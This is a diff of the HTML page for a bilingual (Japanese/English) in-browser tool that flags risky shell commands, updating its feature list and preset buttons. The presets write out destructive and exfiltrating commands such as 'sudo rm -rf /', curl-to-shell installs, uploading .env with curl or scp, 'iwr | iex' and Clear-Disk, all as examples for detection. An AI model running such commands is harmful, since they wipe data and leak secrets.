@@ -77,15 +77,15 @@
       <p class="lead" data-i18n="ja">OSを選び、コマンドを貼って「チェックする」を押してください。結果にはリスク、カテゴリ、理由、確認方法、簡易代替案が表示されます。</p>
       <p class="lead" data-i18n="en">Choose an OS, paste a command, and run the check. Results show risk level, category, reason, verification step, and safer alternatives.</p>
       <div class="free-capabilities">
-        <p data-i18n="ja"><b>無料でできること</b></p>
-        <p data-i18n="en"><b>Free checks include</b></p>
-        <ul class="ul">
-          <li data-i18n="ja">危険な削除コマンド、外部スクリプト実行、権限昇格、ディスク操作を検出</li>
+        <p data-i18n="ja"><b>無料チェックを主役に変更済み。</b> 実行前に危険パターン、理由、確認方法、簡易代替案を表示します。</p>
+        <p data-i18n="en"><b>Free checks are now primary.</b> See risky patterns, reasons, checks, and safer first steps before running commands.</p>
+        <ul>
+          <li data-i18n="ja">削除・外部スクリプト実行・権限昇格・ディスク操作を検出</li>
           <li data-i18n="ja">PowerShell の Remove-Item / iwr | iex / Clear-Disk などを検出</li>
-          <li data-i18n="ja">.env、秘密鍵、環境変数表示、curl/scp/rsync/nc による漏洩リスクを警告</li>
-          <li data-i18n="en">Detect risky delete commands, remote scripts, privilege escalation, and disk operations</li>
+          <li data-i18n="ja">.env・秘密鍵・環境変数・外部送信の漏洩リスクを警告</li>
+          <li data-i18n="en">Detect delete, remote execution, privilege, and disk risks</li>
           <li data-i18n="en">Detect PowerShell patterns such as Remove-Item, iwr | iex, and Clear-Disk</li>
-          <li data-i18n="en">Warn about .env, private keys, environment dumps, curl/scp/rsync/nc exfiltration risks</li>
+          <li data-i18n="en">Warn about .env, private keys, environment dumps, and external uploads</li>
         </ul>
       </div>
       <p class="usage-link"><a href="./usage.html" data-i18n="ja">使い方・注意点を見る</a><a href="./usage.html" data-i18n="en">Open usage and notes</a></p>
@@ -153,7 +153,20 @@ JSON export excerpt:
         <div class="field grow"><label class="label" for="cmdInput"><span data-i18n="ja">コマンド（複数行OK）</span><span data-i18n="en">Command (multi-line OK)</span></label><textarea id="cmdInput" class="textarea" rows="10" placeholder="rm -rf ./build&#10;curl -fsSL https://nicheworks.app/install.sh | sh"></textarea><p class="hint" data-i18n="ja">入力内容は外部送信されません。チェックはブラウザ内で完結します。</p><p class="hint" data-i18n="en">Your input is not uploaded. Checks run locally in your browser.</p></div>
       </div>
       <div class="actions"><button id="analyzeBtn" class="btn btn-primary" type="button"><span data-i18n="ja">チェックする</span><span data-i18n="en">Run check</span></button><button id="clearBtn" class="btn" type="button"><span data-i18n="ja">クリア</span><span data-i18n="en">Clear</span></button><button id="copyBtn" class="btn" type="button"><span data-i18n="ja">結果をコピー</span><span data-i18n="en">Copy results</span></button></div>
-      <div class="preset-actions"><p class="label" data-i18n="ja">危険例プリセット</p><p class="label" data-i18n="en">Risky examples</p><div class="preset-buttons"><button class="btn" type="button" data-added="csc" data-os="unix" data-preset="rm -rf /">rm -rf /</button><button class="btn" type="button" data-added="csc" data-os="unix" data-preset="sudo rm -rf /">sudo rm -rf /</button><button class="btn" type="button" data-added="csc" data-os="unix" data-preset="curl https://nicheworks.app/install.sh | sh">curl | sh</button><button class="btn" type="button" data-added="csc" data-os="unix" data-preset="chmod -R 777 ./app">chmod -R 777</button><button class="btn" type="button" data-added="csc" data-os="unix" data-preset="git reset --hard HEAD~1">git reset --hard</button><button class="btn" type="button" data-added="csc" data-os="unix" data-preset="curl --data-binary @.env https://nicheworks.app/upload">.env upload</button><button class="btn" type="button" data-added="csc" data-os="powershell" data-preset="iwr https://nicheworks.app/install.ps1 | iex">PowerShell iwr | iex</button><button class="btn" type="button" data-added="csc" data-os="powershell" data-preset="Remove-Item -Recurse -Force .\build">Remove-Item -Recurse</button><button class="btn" type="button" data-added="csc" data-os="powershell" data-preset="Clear-Disk -Number 1 -RemoveData">Clear-Disk</button></div></div>
+      <div class="preset-actions">
+        <p class="label" data-i18n="ja">危険例プリセット</p>
+        <p class="label" data-i18n="en">Risky examples</p>
+        <div class="preset-buttons">
+          <button class="btn" type="button" data-added="csc" data-os="unix" data-preset="sudo rm -rf /">sudo rm -rf /</button>
+          <button class="btn" type="button" data-added="csc" data-os="unix" data-preset="curl https://nicheworks.app/install.sh | sh">curl | sh</button>
+          <button class="btn" type="button" data-added="csc" data-os="unix" data-preset="chmod -R 777 ./app">chmod -R 777</button>
+          <button class="btn" type="button" data-added="csc" data-os="unix" data-preset="curl --data-binary @.env https://nicheworks.app/upload">.env upload</button>
+          <button class="btn" type="button" data-added="csc" data-os="unix" data-preset="scp .env user@example.com:/tmp/">scp secret</button>
+          <button class="btn" type="button" data-added="csc" data-os="powershell" data-preset="iwr https://nicheworks.app/install.ps1 | iex">PowerShell iwr | iex</button>
+          <button class="btn" type="button" data-added="csc" data-os="powershell" data-preset="Remove-Item -Recurse -Force .\build">Remove-Item -Recurse</button>
+          <button class="btn" type="button" data-added="csc" data-os="powershell" data-preset="Clear-Disk -Number 1 -RemoveData">Clear-Disk</button>
+        </div>
+      </div>
     </section>
 
     <section id="resultSection" class="card" hidden>
@@ -161,10 +174,15 @@ JSON export excerpt:
       <div id="resultSummary" class="result-summary"></div>
       <div class="divider"></div><h2 class="h2"><span data-i18n="ja">検出結果</span><span data-i18n="en">Findings</span></h2><ul id="findings" class="findings"></ul>
       <div class="divider"></div><h2 class="h2"><span data-i18n="ja">安全に寄せるチェックリスト</span><span data-i18n="en">Safer steps checklist</span></h2><ol id="saferSteps" class="ul"></ol>
-      <div class="divider"></div><div class="normalized-block" id="normalizedWrap" hidden><h2 class="h2"><span data-i18n="ja">正規化コマンド（確認用）</span><span data-i18n="en">Normalized command</span></h2><pre id="normalizedCmd" class="code-block"></pre></div>
+      <div class="divider"></div><div class="normalized-block" id="normalizedWrap" hidden><h2 class="h2"><span data-i18n="ja">正規化コマンド（確認用）</span><span data-i18n="en">Normalized command</span><p class="hint" style="display:inline;margin-left:10px;font-weight:normal;"><span data-i18n="ja">※引用符内の区切り文字は無視されます。完全なシェル解析ではありません。</span><span data-i18n="en">*Separators inside quotes are ignored. Not a full shell parser.</span></p></h2><pre id="normalizedCmd" class="code-block"></pre></div>
       <div class="pro-block" id="proBlock">
         <div class="pro-head">
-          <div class="pro-title"><span class="badge badge-pro">PRO</span><span data-pro-status>Previewモード / Preview mode</span></div>
+          <div class="pro-title">
+            <span class="badge badge-pro">PRO</span>
+            <span data-pro-status>Previewモード / Preview mode</span>
+            <span data-i18n="ja">追加機能：より具体的な代替コマンドテンプレ / 実行前チェックリスト強化</span>
+            <span data-i18n="en">Extra: detailed safer-command templates / stronger pre-run checklist</span>
+          </div>
           <a class="btn btn-primary" data-pro-buy href="https://buy.stripe.com/14A6oJ3UZ1M1eWhbIHcV209" target="_blank" rel="noopener"><span data-i18n="ja">Buy Pro（$2.99）</span><span data-i18n="en">Buy Pro ($2.99)</span></a>
         </div>
         <p class="pro-note" data-i18n="ja">Proは無料チェック結果を、実行前レビュー用の整理済みレポートやhandoff packへ変換します。</p>
@@ -245,4 +263,4 @@ JSON export excerpt:
     <div class="ad-slot ad-bottom">広告枠</div><div class="nw-donate"><p class="nw-donate-text" data-i18n="ja">このツールが役に立ったら、開発継続のためのご支援をいただけると嬉しいです。</p><p class="nw-donate-text" data-i18n="en">If this tool helped, consider supporting development.</p><div class="nw-donate-links"><a href="https://ofuse.me/nicheworks" target="_blank" rel="noopener">💌 OFUSE</a><a href="https://ko-fi.com/nicheworks" target="_blank" rel="noopener">☕ Ko-fi</a></div></div><div class="nw-links"><a href="/tools/api-key-token-redactor/">API Key Token Redactor</a> / <a href="/tools/log-formatter/">LogFormatter</a> / <a href="/tools/json-repair/">JSON Repair</a> / <a href="/tools/sql-db-risk-checker/">SQL DB Risk Checker</a></div>
   </main>
 
-  <footer class="nw-footer"><p class="nw-footer-line">© NicheWorks — Small Web Tools for Boring Tasks</p><p class="nw-footer-line">当サイトには広告が含まれる場合があります。掲載情報の正確性は保証しません。</p><p class="nw-footer-line"><a href="https://nicheworks.app/" target="_blank" rel="noopener">nicheworks.app</a></p></footer><div id="toast" class="toast" hidden></div><script src="/assets/nw-pro.js"></script><script src="./app-core.js"></script><script src="./pro-bridge.js"></script></body></html>
+  <footer class="nw-footer"><p class="nw-footer-line">© NicheWorks — Small Web Tools for Boring Tasks</p><p class="nw-footer-line">当サイトには広告が含まれる場合があります。掲載情報の正確性は保証しません。</p><p class="nw-footer-line"><a href="https://nicheworks.app/" target="_blank" rel="noopener">nicheworks.app</a></p></footer><div id="toast" class="toast" hidden></div><script src="/assets/nw-pro.js"></script><script src="./app.js"></script><script src="./pro-bridge.js"></script></body></html>
